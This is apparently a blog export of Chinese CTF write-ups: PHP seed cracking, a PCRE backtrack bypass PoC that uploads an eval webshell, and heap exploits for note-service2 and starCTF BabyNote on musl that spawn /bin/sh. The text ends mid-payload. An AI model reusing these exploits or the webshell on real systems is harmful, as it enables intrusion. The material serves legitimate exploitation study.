= 173350945 (PHP 7.1.0+)Found 1, trying 0xfe000000 - 0xffffffff, speed 102.6 Mseeds/s Found 1\n\n得到seed之后再用php就可以跑出来了\n&lt;?php$x = 12;mt_srand(173350945);$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str = &#x27;&#x27;;$len1 = 20;for ($i = 0; $i &lt; $len1; $i++) &#123;    $str .= substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);&#125;echo $str;\n\n\n PHP利用PCRE回溯次数限制绕过某些安全限制\n\n&lt;?phpfunction is_php($data)&#123;      return preg_match(&#x27;/&lt;\\?.*[(`;?&gt;].*/is&#x27;, $data);  &#125;if(!is_php($input)) &#123;    fwrite($f, $input); ...&#125;在is_php为false的时候可以写入webshell\n\n在正则函数匹配的时候会进行以下操作\n\n官方给出的回溯上限为1000000次，若是超出这个次数就会返回false\n所以可以给出对应的poc\nimport requestsfiles = &#123;  &#x27;file&#x27;: (&#x27;aaa&lt;?php eval($_POST[txt]);//&#x27; + &#x27;a&#x27; * 1000000)&#125;res = requests.post(&#x27;http://51.158.75.42:8088/index.php&#x27;, files=files, allow_redirects=False)print(res.headers)\n\n\n一些trick小技巧\n\n这类情况;if (preg_match(&#x27;/^[a-z0-9]*$/isD&#x27;, $func) || preg_match(&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\&#123;|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\&quot;|\\&#x27;|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log/i&#x27;, $arg))&#123;    dir(&#x27;nonono!&#x27;);&#125;else&#123;    //There is no code to print flag in flag.php    $func(&#x27;&#x27;, $arg);&#125;// $func和$arg可控的话// $func = create_function// $arg = ;&#125; include(base64_decode(ZmxhZy5waHA=));var_dump(get_defined_vars());/*   就可以绕过了\n\n","categories":["web"],"tags":["php"]},{"title":"note-service2","url":"/2021/10/29/note-service2/","content":"检查保护\n开启了canary和pie但是没有开启nx，所以堆栈可以执行\n程序执行流程分析一道经典的菜单题目，具体流程可以看题目我在这里只放上有漏洞的代码\n有四个选项，一是增加note，二和三都还没完成，第四就是删掉note\n__int64 sub_CA5()&#123;  __int64 result; // rax  int v1; // [rsp+8h] [rbp-8h]  unsigned int v2; // [rsp+Ch] [rbp-4h]  result = (unsigned int)dword_20209C;  if ( dword_20209C &gt;= 0 )  &#123;    result = (unsigned int)dword_20209C;    if ( dword_20209C &lt;= 11 )    &#123;      printf(&quot;index:&quot;);      v1 = sub_B91();      printf(&quot;size:&quot;);      result = sub_B91();      v2 = result;      if ( (int)result &gt;= 0 &amp;&amp; (int)result &lt;= 8 )      &#123;        qword_2020A0[v1] = malloc((int)result);        if ( !qword_2020A0[v1] )        &#123;          puts(&quot;malloc error&quot;);          exit(0);        &#125;        printf(&quot;content:&quot;);        sub_B69(qword_2020A0[v1], v2);        result = (unsigned int)++dword_20209C;      &#125;    &#125;  &#125;  return result;&#125;\n\n在增加note的时候，首先输入索引值，然后创建一个chunk但是chunk的大小最大为8，又因为程序是堆栈可以执行所以考虑把shellcode写到堆当中。\nexecve对应的系统调用号是59所以amd64的shellcode需要完成的操作是:\nrax = 59rdi = &#x27;/bin/sh&#x27;rsi = 0rdx = 0syscall\n\n这肯定是超过了8字节，所以需要创建多个chunk然后连接起来，通过jmp连接，当我们malloc一个大小为8的chunk的时候他的结构其实是这样\n\n这样一个chunk里面只有fd的位置是我可以控制的，并且在我们可以控制的最后一个字节会被改写成0，所以我们实际可以控制的只有7个字节在构造的时候需要jmp的距离为bk+prev_size+size+1的大小。\n.text:0000000000000B1E                 jmp     short loc_B42.text:0000000000000B20 ; ---------------------------------------------------------------------------.text:0000000000000B20.text:0000000000000B20 loc_B20:                                ; CODE XREF: sub_AC3+49↑j.text:0000000000000B20                 mov     eax, [rbp+var_C].text:0000000000000B23                 movsxd  rdx, eax.text:0000000000000B26                 mov     rax, [rbp+var_18].text:0000000000000B2A                 add     rdx, rax.text:0000000000000B2D                 movzx   eax, [rbp+buf].text:0000000000000B31                 mov     [rdx], al.text:0000000000000B33                 add     [rbp+var_C], 1.text:0000000000000B37.text:0000000000000B37 loc_B37:                                ; CODE XREF: sub_AC3+2A↑j.text:0000000000000B37                 mov     eax, [rbp+var_1C].text:0000000000000B3A                 sub     eax, 1.text:0000000000000B3D                 cmp     eax, [rbp+var_C].text:0000000000000B40                 jg      short loc_AEF.text:0000000000000B42.text:0000000000000B42 loc_B42:  \n\n之间相差0x24个字节但是十六进制当中\n0000000000000B10  F4 48 63 D0 48 8B 45 E8  48 01 D0 C6 00 00 EB 22  ....H.E.........\n\n指令为0x22个字节，所以jmp short的跳跃数其实就是目标地址-当前地址-jmp short的大小\n所以跳跃的距离实际计算方式是bk+prev_size+size+1+2-2=0x19\n分析利用方式有了上面的思路，就需要想怎么往rdi放入’/bin/sh’了可以看到这个函数atoi(nptr);调用方式跟system一样并且nptr是可控的，那么就可以想到是篡改got表了\n.got.plt:0000000000202060 off_202060      dq offset atoi          ; DATA XREF: _atoi↑r.got.plt:0000000000202068 off_202068      dq offset exit          ; DATA XREF: _exit↑r.got.plt:0000000000202068 _got_plt        ends.got.plt:0000000000202068.data:0000000000202070 ; ===========================================================================.data:0000000000202070.data:0000000000202070 ; Segment type: Pure data.data:0000000000202070 ; Segment permissions: Read/Write.data:0000000000202070 _data           segment qword public &#x27;DATA&#x27; use64.data:0000000000202070                 assume cs:_data.data:0000000000202070                 ;org 202070h.data:0000000000202070                 db    0.data:0000000000202071                 db    0.data:0000000000202072                 db    0.data:0000000000202073                 db    0.data:0000000000202074                 db    0.data:0000000000202075                 db    0.data:0000000000202076                 db    0.data:0000000000202077                 db    0.data:0000000000202078 ; void *off_202078.data:0000000000202078 off_202078      dq offset off_202078    ; DATA XREF: sub_A10+17↑r.data:0000000000202078                                         ; .data:off_202078↓o.data:0000000000202078 _data           ends.data:0000000000202078.bss:0000000000202080 ; ===========================================================================.bss:0000000000202080.bss:0000000000202080 ; Segment type: Uninitialized.bss:0000000000202080 ; Segment permissions: Read/Write.bss:0000000000202080 _bss            segment align_32 public &#x27;BSS&#x27; use64.bss:0000000000202080                 assume cs:_bss.bss:0000000000202080                 ;org 202080h.bss:0000000000202080                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing.bss:0000000000202080                 public __bss_start.bss:0000000000202080 ; FILE *_bss_start.bss:0000000000202080 __bss_start     dq ?                    ; DATA XREF: LOAD:0000000000000480↑o.bss:0000000000202080                                         ; LOAD:0000000000000498↑o ....bss:0000000000202080                                         ; Alternative name is &#x27;_edata&#x27;.bss:0000000000202080                                         ; stdout.bss:0000000000202080                                         ; _edata.bss:0000000000202080                                         ; Copy of shared data.bss:0000000000202088                 align 10h.bss:0000000000202090                 public stdin.bss:0000000000202090 ; FILE *stdin.bss:0000000000202090 stdin           dq ?                    ; DATA XREF: LOAD:00000000000004C8↑o.bss:0000000000202090                                         ; sub_A80+4↑r.bss:0000000000202090                                         ; Copy of shared data.bss:0000000000202098 byte_202098     db ?                    ; DATA XREF: sub_A10↑r.bss:0000000000202098                                         ; sub_A10+29↑w.bss:0000000000202099                 align 4.bss:000000000020209C dword_20209C    dd ?                    ; DATA XREF: sub_CA5+8↑r.bss:000000000020209C                                         ; sub_CA5+16↑r ....bss:00000000002020A0 ; _QWORD qword_2020A0[12].bss:00000000002020A0 qword_2020A0    dq 0Ch dup(?)           ; DATA XREF: sub_BE0+18↑o\n\n可以看到堆最开始的地方和我们需要修改的位置距离为0x40字节，最上面的漏洞函数里面数组的索引是没有检测的，那dword_20209C[-8]也就是atoi函数got表的内容，并且不能一开是就修改，因为我们后面写shellcode是还需要atoi函数的\nshellcode写法在文章上面是写了我们要getshell需要的操作:\nmov rax,59mov rsi,0mov rdx,0syscall# rdi由我们自己写用atoi写入\n\n但是问题就出来了，上面的三条指令都已经是7字节了，所以我们需要将命令拆开\nxor rax,raxmov eax,59xor rsi,rsixor rdx,rdx\n\nexpfrom pwn import *elf = ELF(&#x27;./questions/1f10c9df3d784b5ba04b205c1610a11e&#x27;)r = remote(&#x27;111.200.241.244&#x27;, 57872)# r = process(&#x27;./questions/1f10c9df3d784b5ba04b205c1610a11e&#x27;)context.arch = &#x27;amd64&#x27;# context.log_level = &#x27;debug&#x27;def add_note(index, content):    r.recvuntil(b&#x27;your choice&gt;&gt; &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;index:&#x27;)    r.sendline(bytes(str(index), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;size:&#x27;)    r.sendline(bytes(str(8), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;content:&#x27;)    r.send(content)def del_note(index):    r.recvuntil(b&#x27;your choice&gt;&gt; &#x27;)    r.sendline(b&#x27;4&#x27;)    r.recvuntil(b&#x27;index:&#x27;)    r.sendline(bytes(str(index), encoding=&#x27;utf-8&#x27;))code0 = asm(&#x27;xor rax,rax&#x27;)+b&#x27;\\x90\\x90\\xeb\\x19&#x27;code1 = asm(&#x27;mov eax,0x3b&#x27;)+b&#x27;\\xeb\\x19&#x27;code2 = asm(&#x27;xor rsi,rsi&#x27;)+b&#x27;\\x90\\x90\\xeb\\x19&#x27;code3 = asm(&#x27;xor rdx,rdx&#x27;)+b&#x27;\\x90\\x90\\xeb\\x19&#x27;code4 = asm(&#x27;syscall&#x27;).ljust(7, b&#x27;\\x90&#x27;)# 这里\\x90是nop指令add_note(0, code0)add_note(1, code1)add_note(2, code2)add_note(3, code3)add_note(4, code4)del_note(0)add_note(-8, code0)r.recvuntil(b&#x27;your choice&gt;&gt; &#x27;)r.sendline(b&#x27;/bin/sh&#x27;)r.interactive()\n\n\n\n\n\n","categories":["pwn-xctf"],"tags":["篡改got表"]},{"title":"musl1.2.2源码分析+starCTF-BabyNote复现","url":"/2022/05/10/musl1-2-2%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-starCTF-BabyNote%E5%A4%8D%E7%8E%B0/","content":"源码分析数据结构这里根据我参考的文章来进行分析，chunk-&gt;group-&gt;mate\nchunk这里其实是没有定义chunk这个结构的，不过根据效果可以推断出来\nchunk关于0x10字节对其，如果是group中的第一个chunk，p的前0x10字节作为group结构体的头部，包括meta地址等。如果不是第一个chunk，只有前4字节作为元数据，包括了idx和offset，用来计算与该chunk与group地址的偏移。如果该chunk被释放，idx会被写为0xff，offset为0。idx和offset的作用就是free时根据chunk地址找到该group对应meta的地址，也为漏洞利用做了铺垫。\nstruct chunk&#123; char prev_user_data[];    uint8_t idx;  //低5bit为idx第几个chunk    uint16_t offset; //与第一个chunk起始地址的偏移，实际地址偏移为offset * UNIT    char data[];&#125;;\n\ngroup在musl中一个meta管理的内存区域用group表示，一个meta对应一个group。group中存放size相同的相邻chunk，通过idx和offset索引。\nstruct group &#123;    struct meta *meta;// meta的地址    unsigned char active_idx:5;    char pad[UNIT - sizeof(struct meta *) - 1];// 保证0x10字节对齐    unsigned char storage[];# chunk&#125;;\n\n通过chunk获取group地址\nstatic inline struct meta *get_meta(const unsigned char *p)&#123;    assert(!((uintptr_t)p &amp; 15));    int offset = *(const uint16_t *)(p - 2);    int index = get_slot_index(p);    if (p[-4]) &#123;        assert(!offset);        offset = *(uint32_t *)(p - 8);        assert(offset &gt; 0xffff);    &#125;    const struct group *base = (const void *)(p - UNIT*offset - UNIT);  ... ...&#125;\n\n最终就是：\ngroup_addr = chunk_addr - 0x10 * offset - 0x10\n\nmetastruct meta &#123;    struct meta *prev, *next;//双向链表    struct group *mem;// 这里指向管理的group 地址    volatile int avail_mask, freed_mask;    uintptr_t last_idx:5; //group中chunk数    uintptr_t freeable:1;    uintptr_t sizeclass:6; //管理group大小    uintptr_t maplen:8*sizeof(uintptr_t)-12;&#125;;\n\n其中如果这个meta 前后都没有，那么它的prev next 就指向它自己\navail_mask和freed_mask以bitmap方式表示group中chunk的状态\nmeta_arenastruct meta_area &#123;    uint64_t check;    struct meta_area *next;    int nslots;    struct meta slots[];&#125;;\n\n在内存页起始地址，是多个meta的集合，这样是为了meta &amp; 0xffffffffffff000就能找到meta_arena结构体。\n结构体中比较重要的就是check，Musl为了保证meta不被伪造，会验证meta_arena中的check是否与malloc_context中的secret相等。\nmalloc_contextstruct malloc_context &#123;    uint64_t secret;//也就是用于和meta_area验证的值#ifndef PAGESIZE    size_t pagesize;#endif    int init_done;    unsigned mmap_counter;    struct meta *free_meta_head;//释放的meta    struct meta *avail_meta;//可用分配的meta    size_t avail_meta_count, avail_meta_area_count, meta_alloc_shift;    struct meta_area *meta_area_head, *meta_area_tail;    unsigned char *avail_meta_areas;    struct meta *active[48];//可以分配的meta地址，idx与size相关    size_t usage_by_class[48];//所有meta的group管理chunk数量    uint8_t unmap_seq[32], bounces[32];    uint8_t seq;    uintptr_t brk;&#125;;\n\nmalloc和free的源码分析mallocvoid *malloc(size_t n)&#123;\tif (size_overflows(n)) return 0;\tstruct meta *g;\tuint32_t mask, first;\tint sc;\tint idx;\tint ctr;\tif (n &gt;= MMAP_THRESHOLD) &#123;\t\tsize_t needed = n + IB + UNIT;\t\tvoid *p = mmap(0, needed, PROT_READ|PROT_WRITE,\t\t\tMAP_PRIVATE|MAP_ANON, -1, 0);\t\tif (p==MAP_FAILED) return 0;\t\twrlock();\t\tstep_seq();\t\tg = alloc_meta();\t\tif (!g) &#123;\t\t\tunlock();\t\t\tmunmap(p, needed);\t\t\treturn 0;\t\t&#125;\t\tg-&gt;mem = p;\t\tg-&gt;mem-&gt;meta = g;\t\tg-&gt;last_idx = 0;\t\tg-&gt;freeable = 1;\t\tg-&gt;sizeclass = 63;\t\tg-&gt;maplen = (needed+4095)/4096;\t\tg-&gt;avail_mask = g-&gt;freed_mask = 0;\t\t// use a global counter to cycle offset in\t\t// individually-mmapped allocations.\t\tctx.mmap_counter++;\t\tidx = 0;\t\tgoto success;\t&#125;// 这上面就是验证是否超过最大size以及是否使用mmap进行申请空间\tsc = size_to_class(n);// 将size转化成对应的size_classes的下标\trdlock();\tg = ctx.active[sc];// 取出对应sc的meta\t// use coarse size classes initially when there are not yet\t// any groups of desired size. this allows counts of 2 or 3\t// to be allocated at first rather than having to start with\t// 7 or 5, the min counts for even size classes.    // 没找到对应的meta 会执行下面的if语句\tif (!g &amp;&amp; sc&gt;=4 &amp;&amp; sc&lt;32 &amp;&amp; sc!=6 &amp;&amp; !(sc&amp;1) &amp;&amp; !ctx.usage_by_class[sc]) &#123;\t\tsize_t usage = ctx.usage_by_class[sc|1];\t\t// if a new group may be allocated, count it toward\t\t// usage in deciding if we can use coarse class.\t\tif (!ctx.active[sc|1] || (!ctx.active[sc|1]-&gt;avail_mask\t\t    &amp;&amp; !ctx.active[sc|1]-&gt;freed_mask))\t\t\tusage += 3;\t\tif (usage &lt;= 12)\t\t\tsc |= 1;\t\tg = ctx.active[sc];\t&#125;\tfor (;;) &#123;// 寻找对应size的maeta的group可用的chunk\t\tmask = g ? g-&gt;avail_mask : 0;\t\tfirst = mask&amp;-mask;\t\tif (!first) break;\t\tif (RDLOCK_IS_EXCLUSIVE || !MT)\t\t\tg-&gt;avail_mask = mask-first;\t\telse if (a_cas(&amp;g-&gt;avail_mask, mask, mask-first)!=mask)\t\t\tcontinue;\t\tidx = a_ctz_32(first);\t\tgoto success;\t&#125;\tupgradelock();\tidx = alloc_slot(sc, n);// 使用alloc_slot寻找idx\tif (idx &lt; 0) &#123;\t\tunlock();\t\treturn 0;\t&#125;\tg = ctx.active[sc];success:\tctr = ctx.mmap_counter;\tunlock();\treturn enframe(g, idx, n, ctr);// 取出chunk&#125;\n\n下面总结一下：\n 1. 首先是判断size，是否超过限制，或者是否超过阀值\n 2. 若是size没有超过阀值，则会在active里找对应size的meta\n 3. 如果active对应size的meta 位置上为空，没找到那么尝试先找size更大的meta\n 4. 如果active对应size的meta位置上有对应的meta，尝试从这个meta中的group找到可用的chunk\n 5. 如果有空闲的chunk，就直接修改meta-&gt;avail_mask，然后利用enframe(g, idx, n, ctr);\n 6. 从对应meta 中的group 取出 第idx号chunk分配\n 7. 如果没有，break 跳出循环\n 8. 跳出循环后执行`idx = alloc_slot(sc, n);`\n     1. 使用group中被free的chunk\n     2. 从队列中其他meta的group 中找\n     3. 如果都不行就重新分配一个新的group 对应一个新的meta\n 9. enframe(g, idx, n, ctr) 取出 对应meta 中对应idx 的chunk\n\nfreevoid free(void *p)&#123;\tif (!p) return;\tstruct meta *g = get_meta(p);// 得到chunk对应的meta\tint idx = get_slot_index(p);// 得到idx\tsize_t stride = get_stride(g);// 找到size_classes中对应chunk的size\tunsigned char *start = g-&gt;mem-&gt;storage + stride*idx;\tunsigned char *end = start + stride - IB;\tget_nominal_size(p, end);// 算出chunk的真实大小\tuint32_t self = 1u&lt;&lt;idx, all = (2u&lt;&lt;g-&gt;last_idx)-1;\t((unsigned char *)p)[-3] = 255;\t// invalidate offset to group header, and cycle offset of\t// used region within slot if current offset is zero.\t*(uint16_t *)((char *)p-2) = 0;\t// release any whole pages contained in the slot to be freed\t// unless it&#x27;s a single-slot group that will be unmapped.\tif (((uintptr_t)(start-1) ^ (uintptr_t)end) &gt;= 2*PGSZ &amp;&amp; g-&gt;last_idx) &#123;\t\tunsigned char *base = start + (-(uintptr_t)start &amp; (PGSZ-1));\t\tsize_t len = (end-base) &amp; -PGSZ;\t\tif (len) madvise(base, len, MADV_FREE);\t&#125;\t// atomic free without locking if this is neither first or last slot\tfor (;;) &#123;\t\tuint32_t freed = g-&gt;freed_mask;\t\tuint32_t avail = g-&gt;avail_mask;\t\tuint32_t mask = freed | avail; // 将free的chunk加进去\t\tassert(!(mask&amp;self));\t\tif (!freed || mask+self==all) break;\t\tif (!MT)\t\t\tg-&gt;freed_mask = freed+self;\t\telse if (a_cas(&amp;g-&gt;freed_mask, freed, freed+self)!=freed)\t\t\tcontinue;\t\treturn;\t&#125;\twrlock();\tstruct mapinfo mi = nontrivial_free(g, idx);\tunlock();\tif (mi.len) munmap(mi.base, mi.len);&#125;\n\n总结一下：\n 1. 通过get_meta(p)得到meta，通过get_slot_index(p)得到对应chunk的 idx -&gt; 通过get_nominal_size(p, end) 算出真实大小\n 2. 重置idx 和 offset idx 被置为0xff 标记chunk， 修改freed_mask 标记chunk被释放\n 3. 最后调用nontrivial_free 完成关于meta一些剩余操作\n\n\n仔细观察分配的过程，我们也可以看出为什么free 的chunk不能立即回收使用，因为有空闲的chunk的时候，分配chunk是直接设置meta-&gt;avail_mask\n然后直接enframe() 直接从group中取出 chunk即可，不会设置meta-&gt;freed\n\nstatic inline struct meta *get_meta(const unsigned char *p)&#123;\tassert(!((uintptr_t)p &amp; 15));\tint offset = *(const uint16_t *)(p - 2);\tint index = get_slot_index(p);\tif (p[-4]) &#123;\t\tassert(!offset);\t\toffset = *(uint32_t *)(p - 8);\t\tassert(offset &gt; 0xffff);\t&#125;\tconst struct group *base = (const void *)(p - UNIT*offset - UNIT);// 通过offset 和chunk 地址计算出group地址\tconst struct meta *meta = base-&gt;meta;// 得到meta地址\tassert(meta-&gt;mem == base);// 检查meta 是否指向对应的group\tassert(index &lt;= meta-&gt;last_idx);// 检查chunk idx 是否超过 meta 最大chunk 容量\tassert(!(meta-&gt;avail_mask &amp; (1u&lt;&lt;index)));\tassert(!(meta-&gt;freed_mask &amp; (1u&lt;&lt;index)));\tconst struct meta_area *area = (void *)((uintptr_t)meta &amp; -4096);// 得到meta_area 地址\tassert(area-&gt;check == ctx.secret);// 检查 check 校验值\tif (meta-&gt;sizeclass &lt; 48) &#123;// 检查是否属于 sizeclasses 管理的chunk 大小\t\tassert(offset &gt;= size_classes[meta-&gt;sizeclass]*index);\t\tassert(offset &lt; size_classes[meta-&gt;sizeclass]*(index+1));\t&#125; else &#123;\t\tassert(meta-&gt;sizeclass == 63);\t&#125;\tif (meta-&gt;maplen) &#123;\t\tassert(offset &lt;= meta-&gt;maplen*4096UL/UNIT - 1);\t&#125;\treturn (struct meta *)meta;&#125;\n\nstatic struct mapinfo nontrivial_free(struct meta *g, int i)&#123;\tuint32_t self = 1u&lt;&lt;i;\tint sc = g-&gt;sizeclass;\tuint32_t mask = g-&gt;freed_mask | g-&gt;avail_mask;\tif (mask+self == (2u&lt;&lt;g-&gt;last_idx)-1 &amp;&amp; okay_to_free(g)) &#123;        // 要么释放要么可用，且该meta可以被释放\t\t// any multi-slot group is necessarily on an active list\t\t// here, but single-slot groups might or might not be.\t\tif (g-&gt;next) &#123;            // 如果队列中 有下一个meta\t\t\tassert(sc &lt; 48);\t\t\tint activate_new = (ctx.active[sc]==g);\t\t\tdequeue(&amp;ctx.active[sc], g);            // 在出队操作后 ,ctx.active[sc]==meta -&gt;next  是指的刚刚出队meta 的下一个meta\t\t\tif (activate_new &amp;&amp; ctx.active[sc])\t\t\t\tactivate_group(ctx.active[sc]);\t\t&#125;\t\treturn free_group(g);\t&#125; else if (!mask) &#123;\t\tassert(sc &lt; 48);\t\t// might still be active if there were no allocations\t\t// after last available slot was taken.\t\tif (ctx.active[sc] != g) &#123;\t\t\tqueue(&amp;ctx.active[sc], g);\t\t&#125;\t&#125;\ta_or(&amp;g-&gt;freed_mask, self);\treturn (struct mapinfo)&#123; 0 &#125;;&#125;\n\nstatic inline void dequeue(struct meta **phead, struct meta *m)&#123;\tif (m-&gt;next != m) &#123;\t\tm-&gt;prev-&gt;next = m-&gt;next;\t\tm-&gt;next-&gt;prev = m-&gt;prev;\t\tif (*phead == m) *phead = m-&gt;next;\t&#125; else &#123;\t\t*phead = 0;\t&#125;\tm-&gt;prev = m-&gt;next = 0;&#125;\n\n这里存在不安全的解链操作了\n可以看到没有任何的安全检测就直接往prev写入值了。那么这里进入到dequeue的条件主要有两点：\n\n第一种:如果一个group 中所有的chunk 都已经被使用，且没有free掉的chunk\n第二种:group 中的chunk 当free掉最后一个chunk，都处于freed的状态\n\nBabyNote题目分析这道题的逆向过程也不是很难，可以知道题目维护的是一个单链表的结构\n在比赛期间没发现这道题的漏洞，看了wp发现我少考虑了一种极端情况\nunsigned __int64 sub_16A1()&#123;  void *v1; // [rsp+8h] [rbp-28h] BYREF  __int64 *i; // [rsp+10h] [rbp-20h]  __int64 v3; // [rsp+18h] [rbp-18h]  void *ptr; // [rsp+20h] [rbp-10h]  unsigned __int64 v5; // [rsp+28h] [rbp-8h]  v5 = __readfsqword(0x28u);  v1 = 0LL;  v3 = give_name((__int64 *)&amp;v1);  ptr = (void *)_int_find(v1, v3);  if ( ptr )  &#123;    if ( ptr != (void *)chunk_start || *(_QWORD *)(chunk_start + 0x20) )    &#123;      if ( *((_QWORD *)ptr + 4) )      &#123;        for ( i = &amp;chunk_start; ptr != (void *)*i; i = (__int64 *)(*i + 0x20) )          ;        *i = *((_QWORD *)ptr + 4);      &#125;    &#125;    else    &#123;      chunk_start = 0LL;    &#125;    free(*(void **)ptr);    free(*((void **)ptr + 1));    free(ptr);    puts(&quot;ok&quot;);  &#125;  else  &#123;    puts(&quot;oops.....&quot;);  &#125;  free(v1);  return __readfsqword(0x28u) ^ v5;&#125;unsigned __int64 sub_16A1()&#123;  void *v1; // [rsp+8h] [rbp-28h] BYREF  __int64 *i; // [rsp+10h] [rbp-20h]  __int64 v3; // [rsp+18h] [rbp-18h]  void *ptr; // [rsp+20h] [rbp-10h]  unsigned __int64 v5; // [rsp+28h] [rbp-8h]  v5 = __readfsqword(0x28u);  v1 = 0LL;  v3 = give_name((__int64 *)&amp;v1);  ptr = (void *)_int_find(v1, v3);  if ( ptr )  &#123;    if ( ptr != (void *)chunk_start || *(_QWORD *)(chunk_start + 0x20) )    &#123;      if ( *((_QWORD *)ptr + 4) )      &#123;        for ( i = &amp;chunk_start; ptr != (void *)*i; i = (__int64 *)(*i + 0x20) )          ;        *i = *((_QWORD *)ptr + 4);      &#125;    &#125;    else    &#123;      chunk_start = 0LL;    &#125;    free(*(void **)ptr);    free(*((void **)ptr + 1));    free(ptr);    puts(&quot;ok&quot;);  &#125;  else  &#123;    puts(&quot;oops.....&quot;);  &#125;  free(v1);  return __readfsqword(0x28u) ^ v5;&#125;\n\n也就是当最后一个结点(也是第一个生成的结点)被删除的时候，倒数第二个结点(也就是第二个生成的结点)的next指针还是会指向最后一个结点，这也就造成了UAF\n利用过程首先生成UAF的chunk\ncreate(0x38, b&#x27;a&#x27; * 0x38, 0x28, b&#x27;a&#x27; * 0x28)create(0x38, b&#x27;b&#x27; * 0x38, 0x38, b&#x27;b&#x27; * 0x38)delete(0x38, b&#x27;a&#x27; * 0x38)\n\n\n可以看到其实已经是造成了UAF了\n这个时候我们如果在free的chunk这里生成一个管理堆块即可泄漏出堆地址，但是上面提到了musl在free后不会直接该表avail的值，而是等avail用完了才会根据freed修改avail。\n\n可以看到当前的meta，题目的show函数也是会创建chunk然后free掉的，所以修改掉即可。\nfor i in range(7):    find(0x28, b&#x27;a&#x27; * 0x28)\n\n\n那么下一次申请的管理堆块就会是我们上面的内容堆块\n我发现如果单纯的按照上面的操作会出现后面生成的管理堆会覆盖掉以前的管理堆导致破坏了UAF，所以我在前面新增了一段代码\ncreate(0x38, b&#x27;d&#x27; * 0x38, 0x38, b&#x27;d&#x27; * 0x38)for i in range(8):    find(0x28, b&#x27;a&#x27; * 0x28)\n\n\n从而达到这种效果，使我们造成UAF的管理堆块在group的最后，避免覆盖\n\n接着进行上面的步骤即可实现这一效果\n\n紧接着泄漏地址\n根据上面描述的，我们最终利用的其实是dequeue当中的任意地址写，但是在进入这个函数之前会检测secrt值，所以我们还需要泄漏一次，这次泄漏的思路和上面差不多，这里可以通过show函数修改掉我们最开始管理堆块即可进行泄漏。\n到这里已经泄漏完所有的东西了，下一步就是伪造IO_FILE进行FSOP来getshell了\nexpfrom pwn import *r = process(&#x27;babynote&#x27;)elf = ELF(&#x27;babynote&#x27;)libc = ELF(&#x27;libc.so&#x27;)context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]context.arch = &#x27;amd64&#x27;def create(name_size, name, note_size, note):    r.recvuntil(b&#x27;option: &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;name size: &#x27;)    r.sendline(bytes(str(name_size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;name: &#x27;)    r.send(name)    r.recvuntil(b&#x27;note size: &#x27;)    r.sendline(bytes(str(note_size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;note content: &#x27;)    r.send(note)def find(name_size, name):    r.recvuntil(b&#x27;option: &#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;name size: &#x27;)    r.sendline(bytes(str(name_size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;name: &#x27;)    r.send(name)def delete(name_size, name):    r.recvuntil(b&#x27;option: &#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;name size: &#x27;)    r.sendline(bytes(str(name_size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;name: &#x27;)    r.send(name)def forget():    r.recvuntil(b&#x27;option: &#x27;)    r.sendline(b&#x27;4&#x27;)create(0x38, b&#x27;d&#x27; * 0x38, 0x38, b&#x27;d&#x27; * 0x38)for i in range(8):    find(0x28, b&#x27;1&#x27; * 0x28)forget()create(0x38, b&#x27;a&#x27; * 0x38, 0x28, b&#x27;a&#x27; * 0x28)create(0x38, b&#x27;b&#x27; * 0x38, 0x38, b&#x27;b&#x27; * 0x38)delete(0x38, b&#x27;a&#x27; * 0x38)for i in range(6):    find(0x28, b&#x27;a&#x27; * 0x28)create(0x38, b&#x27;c&#x27; * 0x38, 0x58, b&#x27;c&#x27; * 0x58)find(0x38, b&#x27;a&#x27; * 0x38)r.recvuntil(b&#x27;0x28:&#x27;)elf_base = b&#x27;&#x27;libc_base = b&#x27;&#x27;for i in range(6):    elf_base = r.recv(2) + elf_baser.recv(4)for i in range(6):    libc_base = r.recv(2) + libc_baseelf_base = int(elf_base, base=16) - 0x4dc0libc_base = int(libc_base, base=16) - 0xb7870print(hex(elf_base))print(hex(libc_base))__malloc_context = libc_base + 0xb4ac0for i in range(6):    find(0x28, b&#x27;a&#x27; * 0x28)payload = flat(elf_base + 0x4cc0, __malloc_context, 0x38, 0x28, 0)find(0x28, payload)find(0x38, b&#x27;a&#x27; * 0x38)r.recvuntil(b&#x27;0x28:&#x27;)secret = b&#x27;&#x27;for i in range(8):    secret = r.recv(2) + secretsecret = int(secret, base=16)print(hex(secret))__stdout_used = libc_base + 0xb43b0heap_addr = libc_base - 0x7000system = libc_base + libc.symbols[&#x27;system&#x27;]fake_area_addr = heap_addr + 0x1000fake_meta_addr = fake_area_addr + 0x10fake_group_addr = fake_meta_addr + 0x30fake_IO_FILE_addr = fake_group_addr + 0x10fake_meta_area = flat(secret, 0)fake_meta = flat(fake_IO_FILE_addr, __stdout_used, fake_group_addr, (1 &lt;&lt; 1),                 (20 &lt;&lt; 6) | (1 &lt;&lt; 5) | 1 | (0xfff &lt;&lt; 12))fake_meta = fake_meta.ljust(0x30)fake_group = flat(fake_meta_addr, 0)fake_IO_FILE = b&#x27;/bin/sh\\x00&#x27; + b&#x27;a&#x27; * 0x20 + p64(0xdeadbeef) + b&#x27;X&#x27; * 8 + p64(    0xbeefdead) + p64(system) * 2fake_IO_FILE = fake_IO_FILE.ljust(0x500, b&quot;\\x00&quot;)payload = b&#x27;a&#x27; * (    0x1000 - 0x20) + fake_meta_area + fake_meta + fake_group + 